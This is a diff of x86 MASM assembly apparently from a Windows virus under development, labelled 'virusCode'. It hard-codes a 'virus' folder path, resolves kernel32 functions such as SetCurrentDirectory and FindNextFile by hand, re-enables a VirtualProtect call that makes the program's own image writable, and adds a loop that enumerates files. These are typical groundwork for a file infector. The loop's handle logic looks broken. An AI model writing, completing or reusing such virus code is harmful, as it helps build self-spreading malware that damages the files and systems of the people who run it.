@@ -18,6 +18,7 @@ FindFirstFileSuccess            		BYTE                        "First file found 
 FindNextFileError               		BYTE                        "FindNextFile failed ", 0
 FindNextFileSuccess             		BYTE                        "FirstNextFile found with success ", 0
 FolderFound           		  		BYTE                        "Folder found", 0
+PATH							db				    "C:\Documents and Settings\Administrator\Desktop\virus\",0
 .code
 ; -----------------------------------;
 virusCode:
@@ -114,14 +115,15 @@ find_API:
 	
 	call find_first_file
 	
-	
-;	push dword ptr[ebp+virtual_out] 					; make 1st 1000 byte 
-;	push 80h							      	; writeable
-;	push 1000h									; 1000 bytes
-;	push dword ptr[ebp+image_base]
-;	call [ebp+VirtualProtectAddress]
+	invoke ExitProcess,0
+	push dword ptr[ebp+virtual_out] 					; make 1st 1000 byte 
+	push 80h							      	; writeable
+	push 1000h									; 1000 bytes
+	push dword ptr[ebp+image_base]
+	call [ebp+VirtualProtectAddress]
 	
 find_first_file:
+	invoke SetCurrentDirectory,addr PATH
 	lea eax,offset Win32Data
 	add eax,ebp
 	push eax
@@ -129,15 +131,18 @@ find_first_file:
 	add eax,ebp
 	push eax
 	call [ebp+FindFirstFileAAddress]
-	cmp eax , 0
-	mov dword ptr[ebp+search_handle],eax
-	je done_find
 find_next_file:
-	
-	invoke MessageBox, NULL, addr FindFirstFileSuccess , addr FolderFound, MB_OK 
+	cmp eax , 0
+	je done_find
+	mov dword ptr[ebp+search_handle],eax
+	lea eax,offset Win32Data
+	add eax,ebp
+	push eax
+	push dword ptr [ebp+search_handle]
+	call [ebp+FindNextFileAAddress]
+	jmp find_next_file
 done_find:
 	ret
-	invoke ExitProcess,0
 	
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;---------------------------Check kernel32 function----------------------------------------;
@@ -312,8 +317,7 @@ find_APIAddress:
 	push eax
 	push dword ptr [ebp+handle]
 	call [ebp+GetProcAddressAddress]
-	mov [ebp+CreateFileAAddress],eax 
-	
+	mov [ebp+SetCurrentDirectoryAddress],eax 
 	ret	
 
 end_objecttable: 
